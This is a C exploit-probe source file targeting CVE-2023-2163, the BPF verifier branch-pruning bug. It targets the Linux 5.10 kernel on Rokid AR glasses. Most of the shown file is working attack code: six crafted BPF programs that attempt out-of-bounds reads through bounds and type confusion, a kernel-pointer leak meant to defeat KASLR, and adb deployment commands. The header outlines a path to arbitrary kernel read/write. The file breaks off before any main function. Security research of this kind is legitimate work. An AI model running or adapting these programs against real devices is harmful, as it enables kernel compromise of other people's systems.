/*
 * CVE-2023-2163 / CVE-2023-39191 BPF Verifier Deep Exploitation Probe
 * ====================================================================
 *
 * TARGET: Rokid AR Glasses - Linux 5.10.209-perf (ARM64 Cortex-A55 x4)
 *
 * ┌────────────────────────────────────────────────────────────────────┐
 * │  VULNERABILITY DEEP DIVE: Branch Pruning State Confusion          │
 * ├────────────────────────────────────────────────────────────────────┤
 * │                                                                    │
 * │  CVE-2023-2163 exploits incorrect "state equivalence" checking    │
 * │  in the BPF verifier's branch pruning logic.                      │
 * │                                                                    │
 * │  THE BUG:                                                         │
 * │  ─────────────────────────────────────────────────────────────    │
 * │  When verifier visits same instruction via different paths:       │
 * │                                                                    │
 * │    Path A:  r7 = [0, 100]  (bounded by conditional)               │
 * │    Path B:  r7 = [0, 0xFFFFFFFF] (less restrictive path)          │
 * │                                                                    │
 * │  Verifier SHOULD merge to widest bounds, but pruning may cause    │
 * │  it to incorrectly reuse Path A's "safe" analysis for Path B.     │
 * │                                                                    │
 * │  EXPLOITATION:                                                    │
 * │  ─────────────────────────────────────────────────────────────    │
 * │  1. Create divergent paths with different register bounds         │
 * │  2. Make Path A pass verification (narrow bounds)                 │
 * │  3. At runtime, execute Path B with wider bounds                  │
 * │  4. Use confused bounds for OOB memory access                     │
 * │  5. Leak kernel addresses → bypass KASLR                          │
 * │  6. Achieve arbitrary R/W → full kernel compromise                │
 * │                                                                    │
 * └────────────────────────────────────────────────────────────────────┘
 *
 * AFFECTED VERSIONS:
 * ─────────────────────
 * - Linux < 5.10.179 (LTS) - CVE-2023-2163 unpatched
 * - Linux < 5.15.110 (LTS)
 * - Linux < 6.1.27, 6.2.14
 * - 5.10.209 MAY have incomplete vendor backport!
 *
 * CVE-2023-39191 (Related):
 * ─────────────────────────
 * - Improper type resolution in BTF handling
 * - Allows unprivileged users to disable kptr_restrict
 * - Can lead to CAP_PERFMON bypass
 *
 * COMPILE:
 *   aarch64-linux-gnu-gcc -static -O2 -o cve_2023_2163_probe cve_2023_2163_probe.c
 *
 * EXECUTE:
 *   adb push cve_2023_2163_probe /data/local/tmp/
 *   adb shell chmod +x /data/local/tmp/cve_2023_2163_probe
 *   adb shell /data/local/tmp/cve_2023_2163_probe
 *
 * AUTHOR: Security Research - Rokid AR Device Analysis
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include <linux/filter.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

// ============================================================================
// BPF Instruction Macros (ARM64 compatible)
// ============================================================================

#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_5 5
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_9 9
#define BPF_REG_10 10 // Frame pointer (read-only)

#define BPF_PSEUDO_MAP_FD 1

// Instruction building macros
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV32_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU64_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU32_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                    \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (uint32_t)(IMM)), \
        BPF_RAW_INSN(0, 0, 0, 0, (uint32_t)((uint64_t)(IMM) >> 32))

#define BPF_LD_IMM64(DST, IMM) \
    BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_MAP_FD(DST, FD) \
    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, FD)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_CALL_FUNC(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)

// BPF Helper IDs
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_probe_read 4
#define BPF_FUNC_ktime_get_ns 5
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_get_smp_processor_id 8
#define BPF_FUNC_skb_load_bytes 26
#define BPF_FUNC_ringbuf_output 130

// Additional defines for advanced exploitation
#define BPF_JA 0x00
#define BPF_JMP32 0x06

// JMP32 unconditional
#define BPF_JMP32_A(OFF) \
    BPF_RAW_INSN(BPF_JMP32 | BPF_JA, 0, 0, OFF, 0)

// ============================================================================
// BPF Syscall Wrapper
// ============================================================================

static int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

static int create_map(int type, int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int load_prog(int prog_type, struct bpf_insn *insns, int insn_cnt,
                     char *log_buf, int log_size)
{
    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)"GPL",
        .log_buf = (uint64_t)log_buf,
        .log_size = log_size,
        .log_level = 2, // Verbose logging
    };
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int map_update(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = BPF_ANY,
    };
    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int map_lookup(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

// ============================================================================
// Vulnerability Probe #1: Branch Pruning State Confusion
//
// CVE-2023-2163 exploits incorrect state merging when the verifier
// prunes branches. By creating divergent paths with different register
// states, then converging, we may confuse the verifier about bounds.
//
// TECHNIQUE:
// - Set r1 = controlled value
// - Branch based on r1
// - In each branch, manipulate r1 differently
// - After convergence, verifier may have wrong bounds for r1
// - Use r1 as an offset for OOB access
// ============================================================================

static int probe_branch_pruning(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 1] Branch Pruning State Confusion\n");
    printf("─────────────────────────────────────────\n");

    /*
     * This program attempts to confuse the verifier by:
     * 1. Loading a value from map (unknown to verifier)
     * 2. Creating branches that bound the value differently
     * 3. Exploiting state pruning to get incorrect bounds
     *
     * If vulnerable: the verifier will accept an OOB access
     * If patched: the verifier will reject with "invalid access"
     */

    struct bpf_insn prog[] = {
        // r6 = map_fd (save map reference)
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),

        // *(u32*)(fp - 4) = 0 (key = 0)
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),

        // r2 = fp - 4 (pointer to key)
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),

        // r0 = map_lookup_elem(r1, r2)
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        // if r0 == NULL, exit
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 18),

        // r6 = r0 (save map value pointer)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // r7 = *(u64*)(r6 + 0) -- load user-controlled value
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        // ========== BRANCH PRUNING TRIGGER ==========
        // r8 = r7 & 0xFFFFFFFF (mask to 32-bit)
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 0xFFFFFFFF),

        // if r8 > 0x100, goto safe_path (offset +5)
        BPF_JMP_IMM(BPF_JGT, BPF_REG_8, 0x100, 5),

        // VULNERABLE PATH: r8 is "bounded" to [0, 0x100]
        // But 32-bit ALU operations may confuse bounds tracking!

        // r9 = r8 << 3 (multiply by 8, should be bounded to [0, 0x800])
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_8),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 3),

        // Attempt OOB read: r0 = *(u64*)(r6 + r9)
        // If r9 bounds are confused, this could read beyond map value!
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_9),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_JMP_IMM(BPF_JA, 0, 0, 2), // goto exit

        // SAFE PATH: just return 0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_JMP_IMM(BPF_JA, 0, 0, 0), // fall through

        // EXIT
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] VULNERABLE: Verifier accepted potentially OOB access!\n");
        printf("[+] Program loaded (fd=%d)\n", prog_fd);
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] Patched: Verifier rejected (errno=%d)\n", errno);
        if (log_buf[0])
            printf("[LOG] %.800s\n", log_buf);
        return 0;
    }
}

// ============================================================================
// Vulnerability Probe #2: ALU32 to ALU64 Bounds Confusion
//
// The verifier tracks register bounds separately for 32-bit and 64-bit.
// CVE-2023-2163 and related bugs can confuse this tracking, allowing
// 32-bit bounded values to be used in 64-bit operations with wrong bounds.
// ============================================================================

static int probe_alu32_confusion(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 2] ALU32 to ALU64 Bounds Confusion\n");
    printf("──────────────────────────────────────────\n");

    /*
     * Strategy:
     * 1. Get a value from map
     * 2. Use 32-bit operations to create "bounded" state
     * 3. Convert back to 64-bit context
     * 4. Try to use for memory access - verifier may have lost track
     */

    struct bpf_insn prog[] = {
        // Setup: load from map
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 15),

        // r6 = map value ptr
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // r7 = *(u64*)r6  (user controlled 64-bit value)
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        // ========== ALU32 CONFUSION TRIGGER ==========
        // w8 = w7 (32-bit move - should truncate)
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),

        // w8 &= 0xFF (32-bit AND - bounds to [0, 255])
        BPF_ALU32_IMM(BPF_AND, BPF_REG_8, 0xFF),

        // Key insight: after 32-bit operation, what does verifier
        // think about the 64-bit value of r8?

        // r8 <<= 3 (64-bit shift! Uses full 64-bit value)
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 3),

        // if r8 > 2040, goto safe (should never trigger if bounded correctly)
        BPF_JMP_IMM(BPF_JGT, BPF_REG_8, 2040, 4),

        // r6 += r8
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_8),

        // Attempt read - if 32-bit bounds confused, could be OOB
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_EXIT_INSN(),

        // Safe exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] POTENTIAL: ALU32 program loaded - needs runtime test\n");
        printf("[+] Program fd=%d\n", prog_fd);
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] Verifier rejected ALU32 confusion attempt\n");
        if (log_buf[0])
            printf("[LOG] %.600s\n", log_buf);
        return 0;
    }
}

// ============================================================================
// Vulnerability Probe #3: Pointer Arithmetic Confusion
//
// Another variant: confuse the verifier about whether a register
// is a scalar or a pointer by exploiting branch pruning.
// ============================================================================

static int probe_ptr_confusion(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 3] Pointer/Scalar Type Confusion\n");
    printf("────────────────────────────────────────\n");

    /*
     * Attempt to make verifier lose track of register type:
     * scalar vs pointer.
     */

    struct bpf_insn prog[] = {
        // Get map value pointer
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 20),

        // r6 = map ptr, r7 = unknown from map
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        // r8 = 0 initially
        BPF_MOV64_IMM(BPF_REG_8, 0),

        // COMPLEX BRANCHING to confuse verifier
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 100, 3),
        // Path A: r8 stays 0
        BPF_MOV64_IMM(BPF_REG_8, 0),
        BPF_JMP_IMM(BPF_JA, 0, 0, 5),

        // Path B: r8 = r6 (pointer!)
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 200, 2),
        // Sub-path: r8 = r6 + 8
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 8),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),

        // Sub-path: keep r8 = r6
        BPF_JMP_IMM(BPF_JA, 0, 0, 0),

        // CONVERGENCE POINT
        // What type does verifier think r8 is?
        // If confused, it might allow scalar operations on pointer

        // Try to use r8 as offset to r6
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_8, 0, 3),

        // r8 is (maybe) pointer - try to read
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
        BPF_EXIT_INSN(),

        // Return 0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // Null check exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] INTERESTING: Type confusion program accepted!\n");
        printf("[+] fd=%d - Requires further analysis\n", prog_fd);
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] Verifier tracked types correctly\n");
        if (log_buf[0])
            printf("[LOG] %.400s\n", log_buf);
        return 0;
    }
}

// ============================================================================
// Vulnerability Probe #4: Direct KASLR Leak Attempt
//
// If any vulnerability exists, we can use it to leak kernel pointers.
// This probe tests if we can read addresses that look like kernel text.
// ============================================================================

static int probe_kaslr_leak(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 4] KASLR Leak Feasibility Test\n");
    printf("──────────────────────────────────────\n");

    /*
     * This creates a simple program that:
     * 1. Gets map value pointer
     * 2. Stores the pointer value itself back to map
     * 3. We read from userspace to see the kernel pointer
     *
     * The map value pointer is a kernel address!
     */

    struct bpf_insn prog[] = {
        // Get map value pointer
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),

        // r6 = map value ptr (THIS IS A KERNEL ADDRESS!)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Store the pointer value at offset 8 in map value
        // *(u64*)(r6 + 8) = r6
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_6, 8),

        // Return success
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // Null exit
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd < 0)
    {
        printf("[!] Cannot load leak probe: %s\n", strerror(errno));
        return 0;
    }

    printf("[+] Leak probe loaded (fd=%d)\n", prog_fd);

    // Attach to socket and trigger
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0)
    {
        printf("[!] socketpair failed\n");
        close(prog_fd);
        return 0;
    }

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0)
    {
        printf("[!] Cannot attach BPF: %s\n", strerror(errno));
        close(prog_fd);
        close(socks[0]);
        close(socks[1]);
        return 0;
    }

    // Initialize map
    uint32_t key = 0;
    uint64_t value[4] = {0};
    map_update(map_fd, &key, value);

    // Trigger the BPF program
    char msg[] = "trigger";
    send(socks[1], msg, sizeof(msg), 0);

    // Read back from map
    map_lookup(map_fd, &key, value);

    printf("[*] Map contents after trigger:\n");
    printf("    [0] = 0x%016lx\n", value[0]);
    printf("    [1] = 0x%016lx\n", value[1]); // Should contain kernel ptr!
    printf("    [2] = 0x%016lx\n", value[2]);
    printf("    [3] = 0x%016lx\n", value[3]);

    // Check if value[1] looks like a kernel address
    // ARM64 kernel: typically 0xffff... or 0xffffffc...
    if ((value[1] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
    {
        printf("\n[!!!] KASLR BYPASS: Kernel address leaked: 0x%016lx\n", value[1]);
        printf("[!!!] This is a map value address in kernel memory!\n");
        close(prog_fd);
        close(socks[0]);
        close(socks[1]);
        return 1;
    }
    else if (value[1] != 0)
    {
        printf("\n[?] Non-zero value at [1]: 0x%016lx\n", value[1]);
        printf("[*] May need further analysis\n");
    }
    else
    {
        printf("\n[OK] No obvious kernel pointer leak\n");
    }

    close(prog_fd);
    close(socks[0]);
    close(socks[1]);
    return 0;
}

// ============================================================================
// Vulnerability Probe #5: JMP32 Specific Bug
//
// Some verifier bugs are specific to JMP32 instructions which have
// different handling than JMP64.
// ============================================================================

static int probe_jmp32_bug(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 5] JMP32 Specific Bounds Confusion\n");
    printf("──────────────────────────────────────────\n");

    struct bpf_insn prog[] = {
        // Get map value
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 14),

        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0),

        // Use JMP32 for bounds check
        // w7 < 16 ? (32-bit comparison)
        BPF_JMP32_IMM(BPF_JGE, BPF_REG_7, 16, 6),

        // 32-bit bounded, but what about 64-bit?
        // r7 <<= 3 (64-bit operation!)
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 3),

        // r6 += r7
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7),

        // Read at offset
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_EXIT_INSN(),

        // Safe path
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // Null exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] JMP32 bounds confusion - program accepted!\n");
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] JMP32 handled correctly\n");
        if (log_buf[0])
            printf("[LOG] %.400s\n", log_buf);
        return 0;
    }
}

// ============================================================================
// Vulnerability Probe #6: CVE-2023-2163 Exact Replication
//
// This probe replicates the EXACT vulnerability pattern from CVE-2023-2163:
// The verifier's state pruning incorrectly considers two states equivalent
// when they have different register bounds due to path-dependent analysis.
//
// Technical Details:
// - func: do_check() in kernel/bpf/verifier.c
// - Bug: states_equal() doesn't properly handle scalar ID tracking
// - Trigger: Create loop with conditional that bounds register differently
// ============================================================================

static int probe_cve_2023_2163_exact(int map_fd, char *log_buf, int log_size)
{
    printf("\n[PROBE 6] CVE-2023-2163 Exact Pattern Replication\n");
    printf("──────────────────────────────────────────────────\n");

    /*
     * CVE-2023-2163 EXACT EXPLOITATION PATTERN:
     * ─────────────────────────────────────────
     * The vulnerability exists in the verifier's "checkpoints" used for
     * branch pruning. When the verifier sees:
     *
     *   r6 = ktime_get_ns()       // r6 = SCALAR [0, U64_MAX]
     *   r6 &= 0xFF                // r6 = SCALAR [0, 255]
     *
     *   if (r6 > 10) goto path_b
     *
     *   path_a:
     *     r6 += 1                 // r6 = [1, 11]
     *     goto join
     *
     *   path_b:
     *     r6 = 0                  // r6 = 0
     *
     *   join:
     *     // At this CHECKPOINT, verifier stores state
     *     // Due to pruning bug, it may accept r6 = [0, 11] always
     *     // But at runtime, path_a could have r6 up to 256!
     *
     * The fix was in commit 71b547f56124 ("bpf: Fix incorrect verifier pruning
     * due to missing register precision taints").
     */

    struct bpf_insn prog[] = {
        // ═══════════ PHASE 1: Setup ═══════════
        // Get map pointer for data exfiltration
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 35), // Exit if NULL

        // r9 = map_value_ptr (save for later)
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // ═══════════ PHASE 2: Get Unpredictable Value ═══════════
        // r0 = ktime_get_ns()
        BPF_CALL_FUNC(BPF_FUNC_ktime_get_ns),
        // r6 = r0 (save the unpredictable value)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // ═══════════ PHASE 3: Initial Bounds ═══════════
        // r6 &= 0xFFFF (verifier: r6 = [0, 65535])
        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0xFFFF),

        // ═══════════ PHASE 4: Branch Pruning Trigger ═══════════
        // The KEY is creating paths where the verifier might prune incorrectly

        // BRANCH 1: if (r6 > 0x80) goto path_big
        BPF_JMP_IMM(BPF_JGT, BPF_REG_6, 0x80, 7),

        // PATH SMALL: r6 in [0, 0x80] according to verifier
        // r7 = r6
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),
        // Add and subtract to create different scalar IDs
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x10),
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, 0x10),
        // Now r7 should be [0, 0x80] but may have different scalar tracking
        // Store to stack (may affect precision tracking)
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_7, -16),
        // Reload (spill/fill can confuse verifier)
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -16),
        BPF_JMP_IMM(BPF_JA, 0, 0, 8), // goto join

        // PATH BIG: r6 in [0x81, 0xFFFF] according to verifier
        // But we'll make it look "safe" to the verifier
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),
        // Mask to appear bounded (verifier sees [0x81, 0xFF] after mask)
        BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 0xFF),
        // But the upper bits were already set!
        // Add operation that might confuse bounds
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_7, 1),
        // Spill/fill trick
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_7, -16),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_10, -16),
        // Second conditional - more pruning opportunities
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 0x100, 8), // Skip if too big (never triggers)

        // ═══════════ JOIN POINT (Pruning Target) ═══════════
        // Verifier may incorrectly prune here, thinking r7 = [0, 0x100]
        // But at runtime r7 could be [0, 0xFF] depending on path

        // Bounds check that should be sufficient IF verifier is correct
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 0x10, 6), // Safety check

        // ═══════════ PHASE 5: Exploitation ═══════════
        // r7 <<= 4 (multiply by 16)
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 4),

        // r9 += r7 (ptr + offset)
        BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_7),

        // CRITICAL: OOB read if bounds were wrong
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),

        // Return the read value
        BPF_MOV64_REG(BPF_REG_0, BPF_REG_8),
        BPF_EXIT_INSN(),

        // Safety exits
        BPF_MOV64_IMM(BPF_REG_0, 0xDEAD),
        BPF_EXIT_INSN(),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = load_prog(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                            sizeof(prog) / sizeof(prog[0]),
                            log_buf, log_size);

    if (prog_fd >= 0)
    {
        printf("[!!!] CVE-2023-2163 PATTERN ACCEPTED!\n");
        printf("[!!!] Verifier may have incorrect bounds tracking!\n");
        printf("[+] Program fd=%d\n", prog_fd);

        // Try to trigger and observe behavior
        printf("[*] Attempting to trigger program...\n");

        // Create socket pair and attach
        int socks[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) == 0)
        {
            if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF,
                           &prog_fd, sizeof(prog_fd)) == 0)
            {
                // Initialize map
                uint32_t key = 0;
                uint64_t data[32] = {0};
                for (int i = 0; i < 32; i++)
                {
                    data[i] = 0x4141414141414141ULL + i;
                }
                map_update(map_fd, &key, data);

                // Trigger multiple times
                for (int i = 0; i < 10; i++)
                {
                    char msg[] = "test";
                    send(socks[1], msg, sizeof(msg), 0);
                }

                // Check for any OOB artifacts
                map_lookup(map_fd, &key, data);
                printf("[*] Map data after trigger:\n");
                for (int i = 0; i < 8; i++)
                {
                    printf("    [%d] = 0x%016lx\n", i, data[i]);
                }
            }
            close(socks[0]);
            close(socks[1]);
        }

        close(prog_fd);
        return 1;
    }
    else
    {
        printf("[OK] CVE-2023-2163 pattern rejected by verifier\n");
        // Check for specific rejection reason
        if (strstr(log_buf, "invalid mem access"))
        {
            printf("    → Verifier correctly detected potential OOB\n");
        }
        else if (strstr(log_buf, "unbounded"))
        {
            printf("    → Verifier correctly tracked unbounded register\n");
        }
        if (log_buf[0])
            printf("[LOG] %.500s...\n", log_buf);
        return 0;
    }
}

// ============================================================================
